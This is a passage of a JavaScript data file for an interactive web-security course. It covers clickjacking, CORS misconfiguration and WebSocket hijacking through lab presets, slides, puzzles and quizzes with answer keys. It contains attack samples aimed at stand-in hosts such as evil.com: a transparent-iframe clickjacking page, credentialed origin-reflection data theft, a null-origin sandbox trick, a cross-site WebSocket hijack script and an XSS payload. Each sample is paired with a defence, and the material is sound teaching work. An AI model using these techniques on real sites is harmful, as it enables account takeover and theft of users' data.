        options: [
          { text: "A source is a JavaScript property reading user input (e.g. location.search); a sink is a function or setter that executes or renders data (e.g. innerHTML).", correct: true, why: "Correct! Sources supply untrusted data; sinks evaluate or render that data." },
          { text: "Sources run on the backend database, while sinks run in the client browser.", correct: false, why: "Both sources and sinks in DOM vulnerabilities reside entirely within the client-side browser runtime." }
        ]
      },
      {
        q: "Why is innerHTML dangerous while textContent is completely safe against XSS?",
        options: [
          { text: "innerHTML invokes the browser's HTML parser to build DOM trees, whereas textContent creates a literal text node where all tags are inert text.", correct: true, why: "Exactly! textContent treats angle brackets as literal characters without ever invoking the HTML parser." },
          { text: "textContent automatically converts JavaScript into CSS stylesheets.", correct: false, why: "textContent does no code translation; it simply sets the textual content of a node." }
        ]
      }
    ]
  },

  'clickjacking': {
    sandbox: {
      title: "Clickjacking / UI Redressing Lab",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Decoy Overlay Opacity",
      presets: [
        {
          label: "1. Direct Legitimate Visit",
          input: "https://my-bank.com/settings/delete-account",
          http: "GET /settings/delete-account HTTP/1.1\nHost: my-bank.com\nCookie: session=xyz123",
          serverDevBefore: '// User navigates directly in top-level browser window\nres.send(`<button class="danger">Delete Account</button>`);',
          serverInput: "User deliberately clicks 'Delete Account' button",
          serverDevAfter: '// Account deletion processed with genuine user intent\ndeleteUserAccount(user);',
          commentedOut: false,
          status: "200 OK · Account Deleted by Intent",
          statusType: "normal",
          responsePreview: "Account Deleted. We are sorry to see you go.",
          aha: "The user visited the settings page directly in their own tab and clicked the red deletion button with full knowledge and intent.",
          safeServerView: '// Frame protection header set by server\nres.setHeader("Content-Security-Policy", "frame-ancestors \'none\';");',
          safeStatus: "200 OK · Protected From Framing",
          safeAha: "The frame-ancestors directive forbids any other origin from embedding this page in an iframe."
        },
        {
          label: "2. Framing Vulnerability Probe",
          input: "evil.com embeds <iframe src='https://my-bank.com/settings'>",
          http: "GET /settings HTTP/1.1\nHost: my-bank.com\nSec-Fetch-Dest: iframe",
          serverDevBefore: '// Server checks headers: no X-Frame-Options or frame-ancestors present!\nres.removeHeader("X-Frame-Options");',
          serverInput: "Iframe successfully loads inside evil.com parent window",
          serverDevAfter: '// Browser allows nested embedding of sensitive page',
          commentedOut: false,
          status: "200 OK · Framing Permitted",
          statusType: "error",
          responsePreview: "[Embedded Iframe Rendered Inside External Site]",
          aha: "Because the bank omitted framing restriction headers, evil.com was able to embed the authenticated account page inside an iframe.",
          safeServerView: 'res.setHeader("X-Frame-Options", "DENY");',
          safeStatus: "Blocked · Refused to Display in Frame",
          safeAha: "X-Frame-Options DENY instructs browsers to refuse framing attempts regardless of origin."
        },
        {
          label: "3. Transparent Clickjack Attack",
          input: "Opacity: 0.0001 (Invisible Iframe over Decoy Button)",
          http: "GET https://evil.com/play-game.html HTTP/1.1\n\n<button id='decoy'>CLICK TO WIN $1,000!</button>\n<iframe style='opacity:0; position:absolute; top:0; left:0;' src='https://my-bank.com/settings/delete-account'></iframe>",
          serverDevBefore: "// User sees and clicks the tempting 'WIN $1,000' decoy button",
          serverInput: "Browser dispatches click coordinates (x:150, y:80) to top transparent layer",
          serverDevAfter: "// Hidden 'Delete Account' button intercepts click!\ndeleteUserAccount(user);",
          commentedOut: false,
          status: "200 OK · Account Deleted via Decoy Click",
          statusType: "bypass",
          responsePreview: "Victim clicked 'WIN $1000' but bank account was deleted!",
          aha: "The user thought they were playing a game, but the invisible iframe layered above intercepted the mouse click coordinates, triggering account deletion.",
          safeServerView: "Content-Security-Policy: frame-ancestors 'self';",
          safeStatus: "Blocked · Iframe Loading Prevented",
          safeAha: "frame-ancestors 'self' permits framing only by pages belonging to the exact same origin."
        },
        {
          label: "4. Frame-Busting Bypass",
          input: "<iframe sandbox='allow-forms allow-scripts' src='...'>",
          http: "GET https://evil.com/trap.html HTTP/1.1",
          serverDevBefore: "// Bank uses old JS frame-buster: if (top != self) top.location = self.location;",
          serverInput: "Attacker disables top-level navigation using iframe sandbox attribute",
          serverDevAfter: "// Frame buster throws security error; attack succeeds!",
          commentedOut: false,
          status: "200 OK · Frame Buster Neutralized",
          statusType: "bypass",
          responsePreview: "Sandbox attribute neutralized JavaScript frame-buster script.",
          aha: "The iframe sandbox attribute allowed forms and scripts but omitted allow-top-navigation, breaking the legacy frame-busting script and leaving the site vulnerable.",
          safeServerView: "// Rely on HTTP response headers, never client JavaScript\nContent-Security-Policy: frame-ancestors 'none';",
          safeStatus: "Blocked · HTTP Level Defense Active",
          safeAha: "HTTP header-level directives cannot be neutralized by client-side iframe sandbox attributes."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "Attacker Embeds Target Site Inside an Iframe",
        nodes: ["🦹 Attacker Site", "🖼️ Transparent Iframe", "🌐 Victim Browser", "🎯 Target Button"],
        activeNode: 0,
        packetText: "<iframe style='opacity:0'>",
        body: "An attacker creates a bait website featuring a prize, survey, or game. Beneath the surface, they embed the victim's target application inside an iframe positioned precisely over a decoy button.",
        takeaway: "If an application allows framing, its entire UI can be hijacked and restyled."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Browser Action",
        headline: "CSS Styles Render the Iframe Invisible",
        nodes: ["🦹 Attacker Site", "🖼️ Transparent Iframe", "🌐 Victim Browser", "🎯 Target Button"],
        activeNode: 1,
        packetText: "opacity: 0.001; z-index: 100",
        body: "The attacker uses CSS opacity: 0 and absolute positioning to align the target button directly over the decoy button. The victim sees only the alluring decoy button, oblivious to the invisible layer above.",
        takeaway: "The browser's mouse event dispatcher sends click events to the uppermost layer."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Victim Clicks Decoy but Hits Hidden Action",
        nodes: ["🦹 Attacker Site", "🖼️ Transparent Iframe", "🌐 Victim Browser", "🎯 Target Button"],
        activeNode: 2,
        packetText: "Click coordinates hit hidden button",
        body: "When the victim clicks 'Claim Free Gift', the browser dispatches the click event to the invisible target iframe. The authenticated target site immediately executes the sensitive action.",
        takeaway: "The attacker hijacked the user's physical click without stealing credentials or injecting code."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Enforce Content-Security-Policy frame-ancestors",
        nodes: ["🦹 Attacker Site", "🖼️ Transparent Iframe", "🌐 Victim Browser", "🎯 Target Button"],
        activeNode: 1,
        packetText: "CSP: frame-ancestors 'none'",
        body: "Include Content-Security-Policy: frame-ancestors 'none' or 'self' in HTTP response headers. This instructs modern browsers to block all external iframe embedding attempts at the browser level.",
        takeaway: "HTTP response headers are the only fool-proof defense against UI redressing attacks."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: Why is this JavaScript frame-buster bypassable?",
      code: '<script>\n  if (top != self) {\n    top.location = self.location;\n  }\n</script>',
      options: [
        { text: "Because JavaScript runs too slowly to prevent the page from rendering.", correct: false, feedback: "Timing is not the primary issue; the execution environment can be restricted." },
        { text: "The attacker can embed the iframe with sandbox='allow-scripts' without allow-top-navigation, preventing redirection.", correct: true, feedback: "Spot on! The HTML5 sandbox attribute blocks child frames from changing top.location." },
        { text: "Modern browsers have deprecated the 'top' and 'self' window properties.", correct: false, feedback: "'top' and 'self' remain standard global window references in all browsers." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: Inspecting response headers reveals neither X-Frame-Options nor frame-ancestors in Content-Security-Policy.",
        mechanism: "⚙️ What It Means Under the Hood: The browser permits any third-party domain to load this endpoint inside an <iframe>.",
        nextMove: '🎯 How to Verify: Create a test HTML file with <iframe src="TARGET_URL"></iframe> and check if the page loads inside.'
      },
      {
        clue: "👁️ What You Notice: The target action requires pre-filling form fields before clicking the submit button.",
        mechanism: "⚙️ What It Means Under the Hood: Clickjacking requires either URL pre-population (GET params) or combining with drag-and-drop / autofill tricks.",
        nextMove: "🎯 How to Verify: Check if parameters can be passed via URL query strings to pre-populate the form inputs."
      },
      {
        clue: "👁️ What You Notice: The page has X-Frame-Options: SAMEORIGIN, but modern CSP frame-ancestors is absent.",
        mechanism: "⚙️ What It Means Under the Hood: While modern browsers still respect X-Frame-Options, multi-ancestor embedding or proxy scenarios may have loopholes.",
        nextMove: "🎯 How to Verify: Test if subdomains or framing chains (site A frames site B frames site C) are permitted."
      }
    ],
    quiz: [
      {
        q: "What is the primary difference between CSRF and Clickjacking?",
        options: [
          { text: "CSRF forges HTTP requests behind the scenes; Clickjacking tricks the user into physically clicking authenticated UI elements.", correct: true, why: "Correct! Clickjacking exploits user interaction via visual deception; CSRF forges requests without UI interaction." },
          { text: "CSRF only works on mobile devices, while Clickjacking only works on desktop computers.", correct: false, why: "Both attacks work across all modern web browsers and platforms." }
        ]
      },
      {
        q: "Which HTTP header directive is the modern standard for preventing framing?",
        options: [
          { text: "Content-Security-Policy: frame-ancestors 'none'", correct: true, why: "Exactly! frame-ancestors supersedes legacy X-Frame-Options and provides flexible origin control." },
          { text: "X-Content-Type-Options: nosniff", correct: false, why: "nosniff prevents MIME type sniffing, not iframe embedding." }
        ]
      }
    ]
  },

  'cross-origin-resource-sharing-cors': {
    sandbox: {
      title: "CORS Misconfiguration Explorer",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Request Origin Header",
      presets: [
        {
          label: "1. Trusted Same-Origin Request",
          input: "Origin: https://app.target.com",
          http: "GET /api/user/profile HTTP/1.1\nHost: api.target.com\nOrigin: https://app.target.com\nCookie: session=secret123",
          serverDevBefore: 'const origin = req.headers.origin;\n// Check against static whitelist\nif (WHITELIST.includes(origin)) {',
          serverInput: "Access-Control-Allow-Origin: https://app.target.com\nAccess-Control-Allow-Credentials: true",
          serverDevAfter: '  res.json({ email: "user@target.com", balance: 5400 });\n}',
          commentedOut: false,
          status: "200 OK · Data Read Granted",
          statusType: "normal",
          responsePreview: '{"email": "user@target.com", "balance": 5400}',
          aha: "The server verified that https://app.target.com was an approved application origin and granted the browser permission to read the sensitive response.",
          safeServerView: "// Whitelist validation logic\nconst allowed = new Set(['https://app.target.com', 'https://admin.target.com']);\nif (allowed.has(req.headers.origin)) setCorsHeaders(res);",
          safeStatus: "200 OK · Validated Origin",
          safeAha: "Strict set-based whitelist verification ensures only legitimate first-party domains receive CORS clearance."
        },
        {
          label: "2. Origin Reflection Probe",
          input: "Origin: https://attacker.com",
          http: "GET /api/user/profile HTTP/1.1\nHost: api.target.com\nOrigin: https://attacker.com\nCookie: session=secret123",
          serverDevBefore: '// Flawed server code dynamically reflects Origin header\nres.setHeader("Access-Control-Allow-Origin", req.headers.origin);',
          serverInput: "Access-Control-Allow-Origin: https://attacker.com",
          serverDevAfter: '// Server mirrors arbitrary origin without whitelist check!',
          commentedOut: false,
          status: "200 OK · Insecure Origin Reflected",
          statusType: "error",
          responsePreview: "[Headers]: Access-Control-Allow-Origin: https://attacker.com",
          aha: "The server blindly copied the untrusted request Origin into the Access-Control-Allow-Origin response header instead of validating it against an allowlist.",
          safeServerView: '// Reject unknown origin\nif (!WHITELIST.has(req.headers.origin)) res.removeHeader("Access-Control-Allow-Origin");',
          safeStatus: "200 OK · No CORS Headers",
          safeAha: "Omitting Access-Control headers blocks the calling website from reading the HTTP response."
        },
        {
          label: "3. Credentialed Theft (ACAO + ACAC)",
          input: "Origin: https://evil.com with Credentials",
          http: "GET /api/user/profile HTTP/1.1\nHost: api.target.com\nOrigin: https://evil.com\nCookie: session=secret123",
          serverDevBefore: 'res.setHeader("Access-Control-Allow-Origin", req.headers.origin);\nres.setHeader("Access-Control-Allow-Credentials", "true");',
          serverInput: "ACAO: https://evil.com\nACAC: true",
          serverDevAfter: '// Victim browser unlocks response data for evil.com JS!\nres.json({ apiKey: "sk_live_948294820", pii: "Private Data" });',
          commentedOut: false,
          status: "200 OK · Private Data Stolen",
          statusType: "bypass",
          responsePreview: '{"apiKey": "sk_live_948294820", "pii": "Private Data"}',
          aha: "Pairing dynamic origin reflection with Access-Control-Allow-Credentials: true completely destroys the Same-Origin Policy. Malicious scripts on evil.com can read the victim's private API keys.",
          safeServerView: "// Never combine credentials with dynamic reflection\nif (origin !== 'https://trusted.target.com') denyAccess();",
          safeStatus: "403 Forbidden · Origin Rejected",
          safeAha: "Never pair credentials with wildcard origins or unvalidated reflected origins."
        },
        {
          label: "4. Trusting 'null' Origin",
          input: "Origin: null",
          http: "GET /api/user/profile HTTP/1.1\nHost: api.target.com\nOrigin: null\nCookie: session=secret123",
          serverDevBefore: '// Developer whitelisted \'null\' to support local file testing\nif (req.headers.origin === "null") {\n  res.setHeader("Access-Control-Allow-Origin", "null");',
          serverInput: "Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true",
          serverDevAfter: '  res.setHeader("Access-Control-Allow-Credentials", "true");\n}',
          commentedOut: false,
          status: "200 OK · Sandboxed Frame Exploit",
          statusType: "bypass",
          responsePreview: "Private data disclosed to sandboxed iframe with null origin.",
          aha: "Sandboxed iframes without allow-same-origin generate an Origin: null header. An attacker site embeds the target in a sandboxed frame to steal authenticated data.",
          safeServerView: "// Explicitly disallow null origin\nif (!origin || origin === 'null') rejectRequest();",
          safeStatus: "403 Forbidden · Null Origin Prohibited",
          safeAha: "The 'null' origin should never be included in CORS whitelists because any site can forge it via sandboxed frames."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "Attacker Script Issues Cross-Origin Fetch",
        nodes: ["🦹 Attacker Webpage", "🌐 Victim Browser", "📡 API Server", "🔑 Sensitive Data"],
        activeNode: 0,
        packetText: "fetch('api.target.com', credentials)",
        body: "A victim visits evil.com while logged into their target API account. A script on evil.com calls fetch('https://api.target.com/user', {credentials: 'include'}), setting the Origin header.",
        takeaway: "The browser always tags cross-origin fetch requests with the calling page's true Origin."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Server Action",
        headline: "Server Dynamically Reflects Origin in Response",
        nodes: ["🦹 Attacker Webpage", "🌐 Victim Browser", "📡 API Server", "🔑 Sensitive Data"],
        activeNode: 2,
        packetText: "Reflects Origin + ACAC: true",
        body: "The API backend mistakenly assumes CORS is just a nuisance error and dynamically reflects the incoming Origin along with Access-Control-Allow-Credentials: true.",
        takeaway: "CORS headers are instructions for the browser, not firewall filters on the server."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Browser Grants Attacker Script Access to Response",
        nodes: ["🦹 Attacker Webpage", "🌐 Victim Browser", "📡 API Server", "🔑 Sensitive Data"],
        activeNode: 1,
        packetText: "Browser unlocks response to JS",
        body: "The browser checks the CORS headers. Because the server explicitly granted permission to evil.com with credentials, the browser hands the private user JSON over to the attacker's script.",
        takeaway: "The Same-Origin Policy was voluntarily disarmed by server misconfiguration."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Enforce Static Origin Whitelists and Avoid 'null'",
        nodes: ["🦹 Attacker Webpage", "🌐 Victim Browser", "📡 API Server", "🔑 Sensitive Data"],
        activeNode: 2,
        packetText: "Strict Origin Whitelist",
        body: "Never reflect incoming Origin headers into Access-Control-Allow-Origin. Maintain a hard-coded whitelist of trusted domains and never permit the 'null' origin in credentialed contexts.",
        takeaway: "Treat CORS headers as sensitive permission grants and bind them strictly to verified origins."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: What will the browser do when this response is received?",
      code: '// Cross-origin fetch from evil.com with credentials:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true',
      options: [
        { text: "The browser allows evil.com to read the credentialed response.", correct: false, feedback: "Browsers strictly forbid the combination of wildcard '*' origin and allow-credentials true." },
        { text: "The browser blocks the response from being read by JavaScript due to an illegal wildcard combination.", correct: true, feedback: "Spot on! The browser specification explicitly rejects '*' when credentials are true to protect user sessions." },
        { text: "The browser ignores the credentials flag and delivers sanitized data.", correct: false, feedback: "The browser throws a CORS error in the console and denies all access to the response." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: Sending Origin: https://evil.com in Burp returns Access-Control-Allow-Origin: https://evil.com.",
        mechanism: "⚙️ What It Means Under the Hood: The backend application dynamically mirrors arbitrary Origin headers.",
        nextMove: "🎯 How to Verify: Check if Access-Control-Allow-Credentials: true is also returned, enabling full credentialed data exfiltration."
      },
      {
        clue: "👁️ What You Notice: The server allows Origin: https://target.com.evil.com or https://evil-target.com.",
        mechanism: "⚙️ What It Means Under the Hood: The whitelist uses flawed regular expressions (e.g. unescaped dots or missing string boundary anchors ^ and $).",
        nextMove: "🎯 How to Verify: Register or spoof a domain prefix or suffix matching the regex pattern to claim allowed status."
      },
      {
        clue: "👁️ What You Notice: Sending Origin: null in the request returns Access-Control-Allow-Origin: null.",
        mechanism: "⚙️ What It Means Under the Hood: The server whitelisted null to facilitate local file or staging testing.",
        nextMove: '🎯 How to Verify: Craft an exploit using a sandboxed iframe (<iframe sandbox="allow-scripts allow-top-navigation" src="...">) to generate a null origin.'
      }
    ],
    quiz: [
      {
        q: "What is the security purpose of CORS (Cross-Origin Resource Sharing)?",
        options: [
          { text: "To allow web servers to relax the browser's Same-Origin Policy selectively for trusted domains.", correct: true, why: "Correct! CORS does not provide security itself; it creates authorized exceptions to the Same-Origin Policy." },
          { text: "To prevent DDoS attacks by rate-limiting external IP addresses.", correct: false, why: "CORS is a browser-enforced resource-sharing policy, not a network traffic shaper." }
        ]
      },
      {
        q: "Why is Access-Control-Allow-Origin: null extremely dangerous?",
        options: [
          { text: "Any attacker can generate a 'null' origin by executing requests from within a sandboxed iframe or data: URI.", correct: true, why: "Exactly! An attacker doesn't need a specific domain; a simple sandboxed iframe triggers an Origin: null header." },
          { text: "It causes the server to reset its root administrative password.", correct: false, why: "CORS headers only control browser cross-origin read permissions." }
        ]
      }
    ]
  },

  'websockets': {
    sandbox: {
      title: "WebSocket & Handshake Security Lab",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "WebSocket Frame / Handshake Parameter",
      presets: [
        {
          label: "1. Normal WS Handshake & Chat",
          input: '{"action": "message", "text": "Hello support"}',
          http: "GET /chat HTTP/1.1\nHost: target.com\nUpgrade: websocket\nConnection: Upgrade\nOrigin: https://target.com\nCookie: session=xyz",
          serverDevBefore: '// Server validates Origin header during HTTP upgrade\nif (req.headers.origin !== "https://target.com") return socket.destroy();',
          serverInput: 'ws.send(JSON.stringify({ text: "Hello support" }))',
          serverDevAfter: '// Message broadcast to support room\nbroadcastToRoom(room, message);',
          commentedOut: false,
          status: "101 Switching Protocols · Connected",
          statusType: "normal",
          responsePreview: "WebSocket connection established; message received.",
          aha: "The client verified the origin during the handshake upgrade and established a secure, persistent full-duplex channel.",
          safeServerView: '// Handshake origin verification\nif (!ALLOWED_ORIGINS.has(req.headers.origin)) return socket.close(403);',
          safeStatus: "101 Switching Protocols · Origin Verified",
          safeAha: "Validating the Origin header during the HTTP upgrade handshake ensures only authorized origins can open connections."
        },
        {
          label: "2. Handshake Origin Probe",
          input: "Origin: https://evil.com",
          http: "GET /chat HTTP/1.1\nHost: target.com\nUpgrade: websocket\nConnection: Upgrade\nOrigin: https://evil.com\nCookie: session=xyz",
          serverDevBefore: '// Vulnerable server: does NOT check the Origin header!\nupgradeToWebSocket(req, socket);',
          serverInput: "Handshake accepted with arbitrary cross-site origin",
          serverDevAfter: '// Socket upgrade completes successfully with 101 Switching Protocols',
          commentedOut: false,
          status: "101 Switching Protocols · Handshake Permitted",
          statusType: "error",
          responsePreview: "Connection upgraded; server fails to reject cross-site origin.",
          aha: "The WebSocket upgrade was accepted despite Origin: https://evil.com. This indicates the server is vulnerable to Cross-Site WebSocket Hijacking (CSWSH).",
          safeServerView: "if (req.headers.origin !== 'https://target.com') {\n  socket.write('HTTP/1.1 403 Forbidden\\r\\n\\r\\n');\n  return socket.destroy();\n}",
          safeStatus: "403 Forbidden · Handshake Rejected",
          safeAha: "Rejecting unauthorized origins during the upgrade prevents cross-site sites from connecting."
        },
        {
          label: "3. Cross-Site WS Hijack (CSWSH)",
          input: "Attacker site runs new WebSocket('wss://target.com/chat')",
          http: "GET /chat HTTP/1.1\nHost: target.com\nUpgrade: websocket\nConnection: Upgrade\nOrigin: https://evil.com\nCookie: session=xyz",
          serverDevBefore: '// Victim browser auto-sends session cookies during upgrade!\nconst user = getUserBySession(req.cookies.session);',
          serverInput: "evil.com script listens to incoming message frames",
          serverDevAfter: '// Server streams victim\'s entire private chat history over WS\nws.send(JSON.stringify(user.chatHistory));',
          commentedOut: false,
          status: "101 Active · Chat Exfiltrated",
          statusType: "bypass",
          responsePreview: "Private chat transcript exfiltrated to evil.com server.",
          aha: "Because the browser auto-attached the victim's session cookie during the upgrade and the server ignored the Origin header, evil.com hijacked the live WebSocket session.",
          safeServerView: '// Require unpredictable anti-CSRF token in upgrade request URL\nif (req.query.token !== session.wsToken) return socket.destroy();',
          safeStatus: "403 Forbidden · Invalid Handshake Token",
          safeAha: "Binding WebSocket handshakes to unique, session-specific CSRF tokens stops cross-site connection initiation."
        },
        {
          label: "4. WS Message XSS Injection",
          input: '{"message": "<img src=x onerror=alert(document.domain)>"}',
          http: 'WS Frame Data:\n\n{"message": "<img src=x onerror=alert(document.domain)>"}',
          serverDevBefore: '// Server relays message to chat client without HTML encoding\nwsServer.broadcast(msg.message);',
          serverInput: "Client receives unencoded markup into chat DOM",
          serverDevAfter: 'chatBox.innerHTML += message; // Triggers XSS in victim\'s browser',
          commentedOut: false,
          status: "Frame Delivered · XSS Executed",
          statusType: "bypass",
          responsePreview: "[Chat Box Alert]: target.com",
          aha: "WebSockets bypass traditional HTTP layer web application firewalls (WAFs). Unvalidated payloads inside message frames directly trigger DOM XSS in other connected users.",
          safeServerView: '// Sanitize message frames before broadcast\nconst clean = DOMPurify.sanitize(msg.message);',
          safeStatus: "Frame Delivered · Sanitized",
          safeAha: "Validating and sanitizing every individual WebSocket message frame prevents injection attacks over the socket."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "Malicious Page Initiates WebSocket Connection",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 WS Handshake", "💬 Live Socket"],
        activeNode: 0,
        packetText: "new WebSocket('wss://...')",
        body: "A victim visits evil.com while logged into the vulnerable application. A JavaScript script on evil.com creates a new WebSocket connection directed to the target server's chat endpoint.",
        takeaway: "The browser's Same-Origin Policy does NOT restrict initiating cross-origin WebSocket connections."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Browser Action",
        headline: "Browser Upgrades Protocol and Sends Cookies",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 WS Handshake", "💬 Live Socket"],
        activeNode: 2,
        packetText: "Upgrade: websocket + Cookies",
        body: "The browser performs an HTTP GET request with Upgrade: websocket and automatically attaches the victim's session cookies. The request also contains Origin: https://evil.com.",
        takeaway: "Ambient credentials are transmitted during WebSocket upgrades just like standard HTTP requests."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Unchecked Server Connects Socket to Attacker",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 WS Handshake", "💬 Live Socket"],
        activeNode: 3,
        packetText: "Duplex channel opens to attacker",
        body: "The server ignores the Origin header and upgrades the connection. The attacker's script can now send commands as the victim and receive real-time streams of sensitive data.",
        takeaway: "Cross-Site WebSocket Hijacking bypasses all CORS protections because CORS does not govern WebSockets."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Validate Handshake Origin and Require Tokens",
        nodes: ["🦹 Attacker Site", "🌐 Victim Browser", "📡 WS Handshake", "💬 Live Socket"],
        activeNode: 2,
        packetText: "Check Origin & Require Token",
        body: "Verify the Origin header during the handshake against an explicit server allowlist. Require an unpredictable anti-CSRF token in the connection URL or initial authorization frame.",
        takeaway: "Rigorous Origin validation and one-time handshake tokens neutralize WebSocket hijacking."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: Does CORS (Cross-Origin Resource Sharing) protect a WebSocket endpoint from being connected to cross-site?",
      code: '// In attacker script on https://evil.com:\nconst ws = new WebSocket("wss://target.com/messages");\nws.onmessage = (e) => console.log("Leaked:", e.data);',
      options: [
        { text: "Yes, the browser checks CORS preflight before allowing WebSocket connections.", correct: false, feedback: "WebSockets do not use CORS or preflight checks at all; they rely entirely on the Origin header in the upgrade handshake." },
        { text: "No, WebSockets are not restricted by CORS; the server must manually inspect the Origin header in the handshake.", correct: true, feedback: "Spot on! The Same-Origin Policy and CORS do not apply to WebSockets; server-side Origin validation is mandatory." },
        { text: "Yes, but only if the connection uses wss:// (encrypted) rather than ws://.", correct: false, feedback: "Encryption (TLS/WSS) protects transport confidentiality, not cross-origin connection permissions." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: The application issues an HTTP 101 Switching Protocols response with Upgrade: websocket.",
        mechanism: "⚙️ What It Means Under the Hood: The connection transitions from standard HTTP to a persistent, full-duplex TCP WebSocket connection.",
        nextMove: "🎯 How to Verify: Check Burp's WebSockets tab to intercept and observe live messages exchanged over the socket."
      },
      {
        clue: "👁️ What You Notice: Changing the Origin header during the initial handshake request to https://evil.com still yields a 101 response.",
        mechanism: "⚙️ What It Means Under the Hood: The server omits Origin header validation, exposing users to Cross-Site WebSocket Hijacking (CSWSH).",
        nextMove: "🎯 How to Verify: Write a proof-of-concept HTML page on another domain that opens a WebSocket to the target and logs incoming data."
      },
      {
        clue: "👁️ What You Notice: Inputting HTML/script payloads into chat messages reflects immediately in other users' browsers without escaping.",
        mechanism: "⚙️ What It Means Under the Hood: The frontend is rendering incoming WebSocket text frames directly into innerHTML without sanitization.",
        nextMove: "🎯 How to Verify: Send a benign markup test like <b>test</b> over the WebSocket to observe rendering in the chat interface."
      }
    ],
    quiz: [
      {
        q: "Why is Cross-Site WebSocket Hijacking (CSWSH) possible when CORS headers are not configured?",
        options: [
          { text: "The browser does not apply CORS or the Same-Origin Policy to WebSocket handshakes, but it does attach ambient cookies.", correct: true, why: "Correct! Browsers permit cross-origin WebSocket connections by default while still sending session cookies." },
          { text: "WebSockets do not use TCP or HTTP at any stage of communication.", correct: false, why: "WebSockets start with a standard HTTP Upgrade handshake over TCP." }
        ]
      },
      {
        q: "What is the most secure method to authenticate and protect a WebSocket connection against hijacking?",
        options: [
          { text: "Validating the Origin header against a strict whitelist and requiring a one-time cryptographic token during the handshake.", correct: true, why: "Exactly! Combining Origin verification with an unpredictable token guarantees only legitimate pages can connect." },
          { text: "Encoding all WebSocket frames using Base64.", correct: false, why: "Base64 is simple encoding, not authentication or authorization." }
        ]
      }
    ]
  }
};
